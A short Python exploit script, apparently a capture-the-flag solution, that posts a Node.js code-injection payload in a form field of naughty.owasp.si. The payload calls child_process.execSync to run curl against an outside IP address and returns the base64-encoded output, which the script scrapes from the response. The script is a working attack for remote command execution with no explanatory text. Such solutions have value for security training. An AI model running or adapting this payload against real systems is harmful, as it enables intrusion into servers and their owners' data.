#!/usr/bin/env python3

import requests


URL = 'https://naughty.owasp.si/'

cmd = "this.process.mainModule.require('child_process').execSync('curl -s http://65.108.146.8/right.png 2>&1 | base64')"
data = {
    'name': 0,
    'age': cmd,
}
r = requests.post(URL, data=data)
response = r.text
content = response.split('name="status" disabled value="0')[1].split('"><')[0]
print(content)
